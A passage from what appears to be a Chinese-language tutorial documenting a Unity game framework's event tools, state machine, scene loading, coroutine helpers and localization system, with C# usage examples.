void <span class="hljs-built_in">Start</span>()
{
    cube<span class="hljs-selector-class">.OnTriggerEnter</span>(Test3, <span class="hljs-number">2</span>);
}


private void <span class="hljs-built_in">Test3</span>(Collider arg1, int arg3)
{
    Debug<span class="hljs-selector-class">.Log</span>(arg3);
    cube<span class="hljs-selector-class">.RemoveOnTriggerEnter</span>&lt;int&gt;(Test3);
}
</code></pre>
<ul>
<li>触发事件和碰撞事件的API类似，区别参与action的第一个事件本身参数不同，为Collider/Collider2D。</li>
<li>xx为绑定事件的对象组件，使用游戏对象的transform即可。</li>
<li>TEventArg指定事件的参数类型，添加监听时可以不填，可以通过参数args推断出，移除监听时则必须显示指出。</li>
<li>action是绑定的事件，根据事件类型（鼠标、碰撞、自定义事件），其方法的参数列表包含两部分，第一部分是事件本身的参数（PointerEventData、Collision），第二部分是参数列表TEventArg，可以通过值元组传入多个参数。</li>
</ul>
<h4 data-id="heading-91">资源相关事件</h4>
<p>资源释放，对象销毁时绑定的事件。</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//API</span>
<span class="hljs-comment">//资源释放（Addressable）</span>
<span class="hljs-comment">//(this Component com, Action&lt;GameObject, TEventArg&gt; action, TEventArg args = default(TEventArg))</span>
xx<span class="hljs-selector-class">.OnReleaseAddressableAsset</span>&lt;TEventArg&gt;(action, args);
xx<span class="hljs-selector-class">.OnReleaseAddressableAsset</span>(action, args); <span class="hljs-comment">//指定参数类型的泛型可以不填，可以通过参数推断出</span>
xx<span class="hljs-selector-class">.OnReleaseAddressableAssetOnReleaseAddressableAsset</span>(action); <span class="hljs-comment">//无参Action</span>
xx<span class="hljs-selector-class">.RemoveOnReleaseAddressableAsset</span>&lt;TEventArg&gt;(action) <span class="hljs-comment">//Remove时不传参，参数类型必须传，无法推断</span>


<span class="hljs-comment">//对象销毁</span>
<span class="hljs-comment">//(this Component com, Action&lt;GameObject, TEventArg&gt; action, TEventArg args = default(TEventArg))</span>
xx<span class="hljs-selector-class">.OnDestroy</span>&lt;TEventArg&gt;(action, args);
xx<span class="hljs-selector-class">.OnDestroy</span>(action, args); <span class="hljs-comment">//指定参数类型的泛型可以不填，可以通过参数推断出</span>
xx<span class="hljs-selector-class">.OnDestroy</span>(action); <span class="hljs-comment">//无参Action</span>
xx<span class="hljs-selector-class">.RemoveOnDestroy</span>&lt;TEventArg&gt;(action) <span class="hljs-comment">//Remove时不传参，参数类型必须传，无法推断</span>


<span class="hljs-comment">//简单实例</span>
void <span class="hljs-built_in">Start</span>()
{
    cube<span class="hljs-selector-class">.OnDestroy</span>(Test4, <span class="hljs-number">4</span>);
}
private void <span class="hljs-built_in">Test4</span>(GameObject arg1, int arg4)
{
    Debug<span class="hljs-selector-class">.Log</span>(arg4);
    cube<span class="hljs-selector-class">.RemoveOnDestroy</span>&lt;int&gt;(Test4);
}
</code></pre>
<ul>
<li>xx为绑定事件的对象组件，使用游戏对象的transform即可。</li>
<li>TEventArg指定事件的参数类型，添加监听时可以不填，可以通过参数args推断出，移除监听时则必须显示指出。</li>
<li>action是绑定的事件，根据事件类型（鼠标、碰撞、自定义事件），其方法的参数列表包含两部分，第一部分是事件本身的参数（PointerEventData、Collision），第二部分是参数列表TEventArg，可以通过值元组传入多个参数。</li>
</ul>
<h4 data-id="heading-92">移除一类事件</h4>
<p>移除鼠标/碰撞/触发/资源的一类所有事件。</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//API</span>
<span class="hljs-comment">//int customEventTypeInt, JKEventType eventType</span>
<span class="hljs-built_in">RemoveAllListener</span>(customEventTypeInt);
<span class="hljs-built_in">RemoveAllListener</span>(eventType);
<span class="hljs-built_in">RemoveAllListener</span>();
</code></pre>
<ul>
<li>customEventTypeInt/eventType为事件的类型，对应碰撞、鼠标事件对应的枚举类型或自定义事件的类型int值。</li>
<li>不填则移除所有事件。</li>
</ul>
<h3 data-id="heading-93">使用值元组传递多个事件参数</h3>
<p>通过ValueTuple封装一个简单的参数列表结构体。</p>
<pre><code class="hljs language-csharp" lang="csharp">    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Start</span>()</span>
    {
        cube.OnClick(Test5, (arg1: <span class="hljs-number">2</span>, arg2: <span class="hljs-string">"test"</span>, arg3: <span class="hljs-literal">true</span>));
        <span class="hljs-comment">//等同于下一行代码，上一行更简便，参数类型可以自动推断出</span>
        cube.OnClick(Test5, ValueTuple.Create&lt;<span class="hljs-built_in">int</span>,<span class="hljs-built_in">string</span>,<span class="hljs-built_in">bool</span>&gt;(<span class="hljs-number">1</span>,<span class="hljs-string">"test"</span>,<span class="hljs-literal">true</span>));
    }


    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Test5</span>(<span class="hljs-params">PointerEventData arg1, (<span class="hljs-built_in">int</span> arg1, <span class="hljs-built_in">string</span> arg2, <span class="hljs-built_in">bool</span> arg3</span>) args)</span>
    {
        Debug.Log(<span class="hljs-string">$"<span class="hljs-subst">{args.arg1}</span>,<span class="hljs-subst">{args.arg2}</span>,<span class="hljs-subst">{args.arg3}</span>"</span>);
        cube.RemoveOnClick&lt;(<span class="hljs-built_in">int</span> arg1, <span class="hljs-built_in">string</span> arg2, <span class="hljs-built_in">bool</span> arg3)&gt;(Test5);
    }
</code></pre>
<h3 data-id="heading-94">自定义事件类型</h3>
<p>以上鼠标、碰撞等事件的触发由事件工具结合特定的时机自动完成，如果希望自定义事件的触发逻辑，则需要添加新的事件类型,对应在适合的地方触发事件，此时事件工具的作用与事件系统类似，区别在于不需要为对象挂载脚本。</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//API</span>
<span class="hljs-comment">//(this Component com, int customEventTypeInt, Action&lt;T, TEventArg&gt; action, TEventArg args = default(TEventArg))</span>
xx<span class="hljs-selector-class">.AddEventListener</span>&lt;T, TEventArg&gt;(customEventTypeInt, action, args);
xx<span class="hljs-selector-class">.RemoveEventListener</span>&lt;T, TEventArg&gt;(customEventTypeInt, action);
cube<span class="hljs-selector-class">.TriggerCustomEvent</span>&lt;<span class="hljs-attribute">Transform</span>&gt;((int)myType<span class="hljs-selector-class">.CustomType</span>, <span class="hljs-attribute">transform</span>);


<span class="hljs-comment">//使用示例</span>
    void <span class="hljs-built_in">Start</span>()
    {
        cube<span class="hljs-selector-class">.AddEventListener</span>&lt;<span class="hljs-attribute">Transform</span>, int&gt;((int)myType<span class="hljs-selector-class">.CustomType</span>, Test6, <span class="hljs-number">1</span>);
    }


    private void <span class="hljs-built_in">Test6</span>(Transform arg1, int arg2)
    {
        Debug<span class="hljs-selector-class">.Log</span>(arg1.position = Vector3.zero);
        cube<span class="hljs-selector-class">.RemoveEventListener</span>&lt;<span class="hljs-attribute">Transform</span>, int&gt;((int)myType<span class="hljs-selector-class">.CustomType</span>, Test6);
    }
    enum myType
    {
        CustomType = <span class="hljs-number">0</span>,
    }
</code></pre>
<ul>
<li>customEventTypeInt是自定义的事件类型，是一个int值，可以使用枚举对应事件的类型。</li>
<li>T指明了自定义事件所使用的eventData，可以在触发的时候传入T以供使用，等同于Collision/Collider/PointerEventData。</li>
<li>args是参数列表。</li>
</ul>
<h3 data-id="heading-95">补充说明</h3>
<ul>
<li>事件工具针对的事件触发时都会提供eventData用于获取触发时的特定数据用于操作（有点类似于异步callback回调时传的那个参数），比如PointerEventData，因此他们与对象绑定，就算不传任何参数，触发时还是可以根据eventData去获取一些信息，比如碰撞发生的位置。</li>
<li>开发事件工具的目的在于快速为游戏对象添加一类事件的监听，而不需要为其手动挂载脚本（类似于button.OnClick.AddEventListener,但Unity只支持按钮的自动添加，而事件工具支持常见的所有事件类型），实际上会自动为其自动挂载JKEventListener脚本，其中有对应事件的监听方法以及内置碰撞/鼠标等事件的触发方法。</li>
<li>自定义事件类型是支持的，但此时事件的类型，触发需要自己实现。</li>
<li>事件系统作用在于解耦对象和事件触发的逻辑，让事件中心保存监听的方法，触发时不需要访问对象。而事件工具所负责的是一类与对象强关联的事件，用于解耦对象和事件监听添加的逻辑，不需要手动挂载脚本。二者联动的效果就是A使用事件工具直接为B添加事件监听C，C内部再通过事件系统包一层添加事件监听D，这样外界就可以通过直接访问事件中心触发D（可能的应用场景比如要给所有子弹添加碰撞分解效果，这样无论是事件监听添加还是事件的触发都可以在一个脚本中完成，不需要手动给所有子弹度挂载脚本，也不需要触发时访问所有子弹对象）。</li>
</ul>
<h2 data-id="heading-96">状态机</h2>
<p>游戏中的状态机（state machine）是一种在编程中常用的概念，它用于表示对象或系统的状态以及从一个状态到另一个状态的转换。在游戏中，状态机通常被用于表示游戏对象的状态，例如玩家角色的行动状态，或者敌人的攻击状态。每个状态都有一个特定的行为或属性，而状态之间的转换通常是由特定的事件触发的，例如按下某个按钮或达到某个条件。框架中提供了状态基类和转换功能逻辑。</p>
<h3 data-id="heading-97">状态机的初始化</h3>
<p>使用状态机，本质就是持有状态机脚本的引用与其绑定，为此控制脚本（比如角色控制器PlayerController）需要持有状态机对象,其也是一类脚本资源，可以通过资源系统进行回收管理。</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">//API</span>
stateMachine.Init&lt;T&gt;(owner);
stateMachine.Init(owner);
<span class="hljs-comment">//简单实例</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PlayerController</span> : <span class="hljs-type">MonoBehaviour</span>, <span class="hljs-type">IStateMachineOwner</span>
{
    StateMachine stateMachine;
    <span class="hljs-keyword">private</span> void Start()
    {
        stateMachine = ResSystem.GetOrNew&lt;StateMachine&gt;();
        <span class="hljs-comment">//初始化时进入默认状态Idle</span>
        stateMachine.Init&lt;PlayerIdleState&gt;(<span class="hljs-keyword">this</span>);
  
        <span class="hljs-comment">//初始化时不进入默认状态</span>
        stateMachine.Init(<span class="hljs-keyword">this</span>);
    }
}
</code></pre>
<ul>
<li>PlayerController需要继承IStateMachineOwner接口，目的是限制Init中填入的对象必须为接口子类;</li>
<li>宿主owner用于将PlayerController作为引用传递给stateMachine，因为stateMachine不继承MonoBehavior，想要获取PlayerController的引用相对麻烦，所以直接传递引用。</li>
<li>T（PlayerIdleState）是初始的状态类，使用参数时会自动进入T状态，不填则状态机待机，等待进入新状态。</li>
</ul>
<h3 data-id="heading-98">状态类</h3>
<p>每一个状态实际都是一个状态类脚本，状态机通过切换调用其中的方法完成状态逻辑的切换，状态类脚本继承自状态基类StateBase，包含状态的初始化、进入、退出、Unity生命周期函数（虽然不继承MonoBehaviour，通过托管系统可以实现），初始化只执行一次，可以通过StateMachine调用state的Init方法传递过来的owner获取宿主的信息，比如在角色移动的相关状态中就可以获取Player的Transform组件。</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">PlayerIdleState</span>:<span class="hljs-title">StateBase</span>
{
    Transform transform;
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">override</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Init</span>(<span class="hljs-params">IStateMachineOwner owner</span>)</span>
    {
        transform = ((PlayerController)owner).transform;
    }


    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">override</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Enter</span>()</span>
    {
        <span class="hljs-keyword">base</span>.Enter();
    }
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">override</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Exit</span>()</span>
    {
        <span class="hljs-keyword">base</span>.Exit();
    }
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">override</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Update</span>()</span>
    {
        <span class="hljs-keyword">base</span>.Update();
    }
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">override</span> <span class="hljs-keyword">void</span> <span class="hljs-title">FixedUpdate</span>()</span>
    {
        <span class="hljs-keyword">base</span>.FixedUpdate();
    }


    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">override</span> <span class="hljs-keyword">void</span> <span class="hljs-title">LateUpdate</span>()</span>
    {
        <span class="hljs-keyword">base</span>.LateUpdate();
    }
}
</code></pre>
<h3 data-id="heading-99">状态的切换</h3>
<p>在切换状态时，状态类会先被获取并存储起来供下次重复使用，当前状态的所有方法停止工作，切换到新状态的方法执行,在实际使用时，可以再封装一层ChangeState逻辑使用枚举与不同的状态类对应，简化代码。</p>
<pre><code class="hljs language-ini" lang="ini">//API
//(bool <span class="hljs-attr">reCurrstate</span> = <span class="hljs-literal">false</span>)
stateMachine.ChangeState&lt;T&gt;(reCurrstate)
</code></pre>
<ul>
<li>reCurrstate指当前状态和要切换的状态相同时是否还要切换，默认为False相同状态不执行切换。</li>
</ul>
<h3 data-id="heading-100">状态共享数据</h3>
<p>为owner-stateMachine下的所有状态提供共享字典。</p>
<pre><code class="hljs language-scss" lang="scss">public void <span class="hljs-built_in">ShareData</span>()<span class="hljs-comment">//状态类内</span>
{
    <span class="hljs-comment">//(string key, object data)</span>
    <span class="hljs-built_in">RemoveShareData</span>("test");
    <span class="hljs-built_in">ContainsShareData</span>("test");
    <span class="hljs-built_in">AddShareData</span>("test",<span class="hljs-number">1</span>);
    int result = <span class="hljs-number">0</span>;
    TryGetShareData&lt;int&gt;("test", out result);
    <span class="hljs-built_in">UpdateShareData</span>("test", <span class="hljs-number">1</span>);
    <span class="hljs-built_in">CleanShareData</span>();
  
    stateMachine<span class="hljs-selector-class">.CleanShareData</span>();
  
}
</code></pre>
<ul>
<li>key,data是需要共享的字典数据，提供CRUD的API，共享数据可以在状态类内使用，也可以通过stateMachine调用API进行CRUD。</li>
</ul>
<h3 data-id="heading-101">状态机状态清空与销毁</h3>
<ul>
<li>状态机停止工作Stop时会清空所保存的所有状态类放入对象池，状态机本身与宿主的引用仍旧保留，可供下次直接使用。</li>
<li>状态机销毁时Destroy除停止工作外会释放与宿主的引用关系，并将自己放回对象池回收利用。</li>
</ul>

<pre><code class="hljs language-ini" lang="ini">stateMachine.Stop()<span class="hljs-comment">;</span>
stateMachine.Destroy()<span class="hljs-comment">;</span>
</code></pre>
<h2 data-id="heading-102">场景系统</h2>
<p>场景系统提供了正常加载场景和异步加载的若干API。</p>
<h3 data-id="heading-103">正常加载场景</h3>
<pre><code class="hljs language-ini" lang="ini">//API
//(string sceneName, LoadSceneMode <span class="hljs-attr">mode</span> = LoadSceneMode.Single)
SceneSystem.LoadScene(sceneName, LoadSceneMode <span class="hljs-attr">mode</span> = LoadSceneMode.Single)<span class="hljs-comment">;</span>
//(int sceneBuildIndex, LoadSceneMode <span class="hljs-attr">mode</span> = LoadSceneMode.Single)
SceneSystem.LoadScene(sceneBuildIndex, LoadSceneMode <span class="hljs-attr">mode</span> = LoadSceneMode.Single)<span class="hljs-comment">;</span>
//(string sceneName, LoadSceneParameters loadSceneParameters)
SceneSystem.LoadScene(sceneName, loadSceneParameters)<span class="hljs-comment">;</span>
//(int sceneBuildIndex, LoadSceneParameters loadSceneParameters)
SceneSystem.LoadScene(sceneBuildIndex, loadSceneParameters)<span class="hljs-comment">;</span>


//使用实例 加载SampleScene场景并Destroy当前场景
SceneSystem.LoadScene("SampleScene",LoadSceneMode.Single)<span class="hljs-comment">;</span>
</code></pre>
<ul>
<li>sceneName对应BuildSetting中的场景名。</li>
<li>sceneBuildIndex对应BuildSetting中的场景索引号。</li>
<li>mode是场景的加载模式，默认为Single表示加载新场景会销毁当前场景，Additive则保留当前场景，将新场景加入到当前场景中。</li>
<li>loadSceneParameters是场景加载的参数，除可指定加载模式外，还可指定优先级等，具体如图。</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a6b5b8f9bbfc4dab84262005d24e4078~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3ODkyMjU0MTE4MjkwMQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764480691&amp;x-signature=G8y3ir5iNkqLV65VznxkcYeFR%2Bg%3D" alt="alt" loading="lazy"/>​</p>
<h3 data-id="heading-104">异步加载场景</h3>
<p>异步加载场景可在加载大规模场景时不阻塞主线程，而是通过协程或回调等方式在后台加载场景资源，并在加载完成后通知游戏主线程。</p>
<p>异步加载过程中主线程获取进度的方式有两种：</p>
<ul>
<li>场景系统异步加载时会将加载进度传递到事件中心中，可以通过监听"LoadingSceneProgress"、"LoadSceneSucceed"事件获取加载进度。</li>
<li>异步加载提供了回调事件参数，可以通过传入回调函数获取加载进度。</li>
</ul>

<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//API</span>
<span class="hljs-comment">//(string sceneName, Action&lt;float&gt; callBack = null, LoadSceneMode mode = LoadSceneMode.Single)</span>
SceneSystem<span class="hljs-selector-class">.LoadSceneAsync</span>(sceneName, callBack, mode);
<span class="hljs-comment">//(int sceneBuildIndex, Action&lt;float&gt; callBack = null, LoadSceneMode mode = LoadSceneMode.Single)</span>
SceneSystem<span class="hljs-selector-class">.LoadSceneAsync</span>(sceneBuildIndex, callBack, mode);


<span class="hljs-comment">//简单实例 异步加载场景SampleScene并实时输出加载进度，在加载完成时输出Success</span>
<span class="hljs-comment">//方式1 监听事件获取加载进度</span>
SceneSystem<span class="hljs-selector-class">.LoadSceneAsync</span>("SampleScene");
<span class="hljs-comment">//(float不写也行,"LoadingSceneProgress"、"LoadSceneSucceed"为固定名称)</span>
EventSystem<span class="hljs-selector-class">.AddEventListener</span>&lt;<span class="hljs-attribute">float</span>&gt;("LoadingSceneProgress", LoadProgress);
EventSystem<span class="hljs-selector-class">.AddEventListener</span>("LoadSceneSucceed");


<span class="hljs-comment">//方式2 传入回调事件callBack</span>
SceneSystem<span class="hljs-selector-class">.LoadSceneAsync</span>("SampleScene", LoadProgress);
EventSystem<span class="hljs-selector-class">.AddEventListener</span>("LoadSceneSucceed");


void <span class="hljs-built_in">LoadProgress</span>(float progress)
{
    Debug<span class="hljs-selector-class">.Log</span>(progress);
}
void <span class="hljs-built_in">LoadSceneSucceed</span>()
{
    Debug<span class="hljs-selector-class">.Log</span>("Success");
}
</code></pre>
<ul>
<li>sceneName对应BuildSetting中的场景名。</li>
<li>sceneBuildIndex对应BuildSetting中的场景索引号。</li>
<li>mode是场景的加载模式，默认为Single表示加载新场景会销毁当前场景，Additive则保留当前场景，将新场景加入到当前场景中。</li>
<li>callBack是float参数无返回值回调事件，用于获取加载进度。</li>
</ul>
<h2 data-id="heading-105">Mono代理系统</h2>
<p>Mono代理系统用于不继承MonoBehavior的脚本启用mono生命周期函数和协程，比如状态机里的状态类，场景系统异步加载时的协程，除代理系统外框架中的各系统都是静态工具类，需要使用Mono的相关方法则通过代理系统完成，因此也只有MonoSystem挂载在面板上，其内部实现是单例。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d08b0bf0c7694e40b145f8440c2771e2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3ODkyMjU0MTE4MjkwMQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764480691&amp;x-signature=ikcwiF5cIGX7nDRN%2B0PhL9q%2FSKU%3D" alt="alt" loading="lazy"/>​</p>
<h3 data-id="heading-106">Mono生命周期函数</h3>
<p>将需要在Update、LateUpdate。FixedUpdate实际执行的逻辑托管给MonoSystem。</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//(Action action)</span>
MonoSystem<span class="hljs-selector-class">.AddUpdateListener</span>(action);
MonoSystem<span class="hljs-selector-class">.RemoveUpdateListener</span>(action);
MonoSystem<span class="hljs-selector-class">.AddLateUpdateListener</span>(action);
MonoSystem<span class="hljs-selector-class">.RemoveLateUpdateListener</span>(action);
MonoSystem<span class="hljs-selector-class">.AddFixedUpdateListener</span>(action);
MonoSystem<span class="hljs-selector-class">.RemoveFixedUpdateListener</span>(action);
</code></pre>
<ul>
<li>action是要在生命周期执行的无参无返回值方法。</li>
</ul>
<h3 data-id="heading-107">协程</h3>
<p>启动/停止协程。</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//API</span>
<span class="hljs-comment">//启动/停止一个协程</span>
<span class="hljs-comment">//(IEnumerator coroutine)</span>
MonoSystem<span class="hljs-selector-class">.Start_Coroutine</span>(coroutine);
<span class="hljs-comment">//(Coroutine routine)</span>
MonoSystem<span class="hljs-selector-class">.Stop_Coroutine</span>(routine);


<span class="hljs-comment">//启动/停止一个协程序并且绑定某个对象</span>
<span class="hljs-comment">//(object obj,IEnumerator coroutine)</span>
MonoSystem<span class="hljs-selector-class">.Start_Coroutine</span>(obj, coroutine);
<span class="hljs-comment">//(object obj,Coroutine routine)</span>
MonoSystem<span class="hljs-selector-class">.Stop_Coroutine</span>(obj, routine);


<span class="hljs-comment">//停止某个对象绑定的所有协程</span>
MonoSystem<span class="hljs-selector-class">.StopAllCoroutine</span>(obj);


<span class="hljs-comment">//停止所有协程</span>
MonoSystem<span class="hljs-selector-class">.StopAllCoroutine</span>();
</code></pre>
<ul>
<li>coroutine是一个迭代器，定义了协程。</li>
<li>routine是要停止的协程。</li>
<li>obj是与协程绑定的对象，可以用于区分不同对象上的相同协程。</li>
</ul>
<h2 data-id="heading-108">协程工具</h2>
<p>提前new好协程所需要的WaitForEndOfFrame、WaitForFixedUpdate、YieldInstruction类的对象,避免GC。</p>
<pre><code class="hljs language-scss" lang="scss">CoroutineTool<span class="hljs-selector-class">.WaitForEndOfFrame</span>();
CoroutineTool<span class="hljs-selector-class">.WaitForFixedUpdate</span>();
<span class="hljs-comment">//(float time)</span>
CoroutineTool<span class="hljs-selector-class">.WaitForSeconds</span>(time);
<span class="hljs-comment">//(float time)不受TimeScale影响</span>
CoroutineTool<span class="hljs-selector-class">.WaitForSecondsRealtime</span>(time);
<span class="hljs-comment">//(int count=1)</span>
CoroutineTool<span class="hljs-selector-class">.WaitForFrames</span>(count);
CoroutineTool<span class="hljs-selector-class">.WaitForFrame</span>();


<span class="hljs-comment">//使用示例</span>
private static IEnumerator <span class="hljs-built_in">DoLoadSceneAsync</span>(...)
{
    yield return CoroutineTool<span class="hljs-selector-class">.WaitForFrame</span>();
}
</code></pre>
<h2 data-id="heading-109">扩展方法</h2>
<p>框架提供了若干扩展方法用于快速调用与对象强关联的系统方法。</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//API</span>
<span class="hljs-comment">//比较两个对象数组,返回bool</span>
<span class="hljs-comment">//(this object[] objs, object[] other)</span>
xx<span class="hljs-selector-class">.ArraryEquals</span>(other);


<span class="hljs-comment">//调用MonoSystem添加/移除生命周期函数</span>
<span class="hljs-comment">//(this object obj, Action action)</span>
xx<span class="hljs-selector-class">.AddUpdate</span>(action);
xx<span class="hljs-selector-class">.removeUpdate</span>(action);
xx<span class="hljs-selector-class">.AddLateUpdate</span>(action);
xx<span class="hljs-selector-class">.RemoveLateUpdate</span>(action);
xx<span class="hljs-selector-class">.AddFixedUpdate</span>(action);
xx<span class="hljs-selector-class">.RemoveLateUpdate</span>(action);


<span class="hljs-comment">//调用MonoSystem启动/停止协程（绑定此对象）</span>
<span class="hljs-comment">//(this object obj, IEnumerator routine)</span>
xx<span class="hljs-selector-class">.StartCoroutine</span>(routine);
<span class="hljs-comment">//(this object obj, Coroutine routine)</span>
xx<span class="hljs-selector-class">.StopCoroutine</span>(routine);
xx<span class="hljs-selector-class">.StopAllCoroutine</span>();


<span class="hljs-comment">//判断GameObject是否为空，返回bool</span>
xx<span class="hljs-selector-class">.IsNull</span>();


<span class="hljs-comment">//当前对象放入对象池</span>
<span class="hljs-comment">//(this GameObject go)</span>
xx<span class="hljs-selector-class">.GameObjectPushPool</span>();
<span class="hljs-comment">//(this Component com)</span>
xx<span class="hljs-selector-class">.GameObjectPushPool</span>();
<span class="hljs-comment">//(this object obj)</span>
xx<span class="hljs-selector-class">.ObjectPushPool</span>();
</code></pre>
<h2 data-id="heading-110">本地化系统</h2>
<p>用于切换不同语言对应的文字素材和图片素材，主要用于UI。</p>
<h3 data-id="heading-111">本地化配置文件的创建</h3>
<p>project面板右键创建Localzation Config，通过SO的方式记录语言配置，红色框为一类素材的key，对应下属若干不同语言的素材，支持文字string或者图片Sprite内容，使用时通过调用这里的资源进行切换，可以作为全局或者专属于某一UI对象的本地化配置文件（即持有此config的SO并通过key和languagetype获取本地化内容）。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/228c85809a5540029cd1c8909adc18a1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3ODkyMjU0MTE4MjkwMQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764480691&amp;x-signature=%2FpdToizbWdXcuYniBUaIvi485PU%3D" alt="alt" loading="lazy"/>​</p>
<h3 data-id="heading-112">全局配置</h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/47ea27bb38254acd90a6f296ed9f30be~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3ODkyMjU0MTE4MjkwMQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764480691&amp;x-signature=%2Fi7Um6nb4ApYNF4aL4iKFnZFctI%3D" alt="alt" loading="lazy"/>​</p>
<p>将创建的Config拖拽给JKFrame下的LocalizationSystem组件，全局的本地化配置绑定完成，通过修改LocalizationSystem的LanguageType修改语言。（可以在运行时下修改全局配置）</p>
<h3 data-id="heading-113">API</h3>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">//切换全局配置的当前语言类型（面板上显示的那个）</span>
<span class="hljs-type">LocalizationSystem</span>.<span class="hljs-type">LanguageType</span> <span class="hljs-operator">=</span> <span class="hljs-type">LanguageType</span>.<span class="hljs-type">SimplifiedChinese</span>;
<span class="hljs-comment">//注册/注销语言更新时触发的事件（含有LanguageType参数的无返回值方法）</span>
<span class="hljs-type">LocalizationSystem</span>.<span class="hljs-type">RegisterLanguageEvent</span>(<span class="hljs-type">Action</span>&lt;<span class="hljs-type">LanguageType</span>&gt; action)
<span class="hljs-type">LocalizationSystem</span>.<span class="hljs-type">UnregisterLanguageEvent</span>(<span class="hljs-type">Action</span>&lt;<span class="hljs-type">LanguageType</span>&gt; action)
<span class="hljs-comment">//获取全局配置文件的某一语言下的数据（文本/图片）</span>
<span class="hljs-type">LocalizationSystem</span>.<span class="hljs-type">GetContent</span>&lt;<span class="hljs-type">T</span>&gt;(string key, <span class="hljs-type">LanguageType</span> languageType)
<span class="hljs-comment">//继承UIWindowBase的窗口脚本可以重写语言更新事件</span>
<span class="hljs-keyword">override</span> void <span class="hljs-type">OnUpdateLanguage</span>(<span class="hljs-type">LanguageType</span> languageType)


<span class="hljs-comment">//使用案例</span>
<span class="hljs-comment">//1.通过脚本直接获得全局本地化配置的数据内容</span>
<span class="hljs-comment">//文本string</span>
string info <span class="hljs-operator">=</span> <span class="hljs-type">LocalizationSystem</span>.<span class="hljs-type">GetContent</span>&lt;<span class="hljs-type">LocalizationStringData</span>&gt;(<span class="hljs-string">"标题"</span>, <span class="hljs-type">LanguageType</span>.<span class="hljs-type">SimplifiedChinese</span>).content;<span class="hljs-comment">//指定中文</span>
string info <span class="hljs-operator">=</span> <span class="hljs-type">LocalizationSystem</span>.<span class="hljs-type">GetContent</span>&lt;<span class="hljs-type">LocalizationStringData</span>&gt;(<span class="hljs-string">"标题"</span>, <span class="hljs-type">LocalizationSystem</span>.<span class="hljs-type">LanguageType</span>).content;<span class="hljs-comment">//当前全局本地化配置的语言</span>
<span class="hljs-comment">//Sprite图片</span>
<span class="hljs-type">Sprite</span> image <span class="hljs-operator">=</span> <span class="hljs-type">LocalizationSystem</span>.<span class="hljs-type">GetContent</span>&lt;<span class="hljs-type">LocalizationImageData</span>&gt;(<span class="hljs-string">"标题图片"</span>, <span class="hljs-type">LanguageType</span>.<span class="hljs-type">SimplifiedChinese</span>).content;


<span class="hljs-comment">//2.通过Collecter由拖拽的方式绑定UI组件和语言配置（见下一小节）</span>
<span class="hljs-comment">//3.通过重写OnUpdateLanguage定制语言更新时的事件触发（见下一小节）</span>
   
</code></pre>
<ul>
<li>action是一个含有languageType的单参数无返回值方法，用于结合传入的语言类型定制触发事件逻辑。</li>
<li>泛型T（LocalizationStringData/LocalizationImageData）用于限定GetContent返回的数据类型，目前支持string和Sprite，可以进行拓展。</li>
<li>key是本地化配置文件SO中的数据key。</li>
<li>LocalizationSystem.LanguageType是当前游戏的语言类型，修改会触发索引中的语言更新方法，进而触发所有窗口的语言更新事件修改语言类型。</li>
</ul>
<h3 data-id="heading-114">UI特化工具及局部配置</h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f2c41502382f49a08204dfa426836112~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3ODkyMjU0MTE4MjkwMQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764480691&amp;x-signature=kSB0YjugRXTn%2B1M3jefVcAFdBhM%3D" alt="alt" loading="lazy"/>​</p>
<ul>
<li>在UI框架中继承UIWindowBase的窗口类会自动持有一个本地化配置A用于窗口的局部配置（可用可不用，只是提供了一个数据传入的接口）。</li>
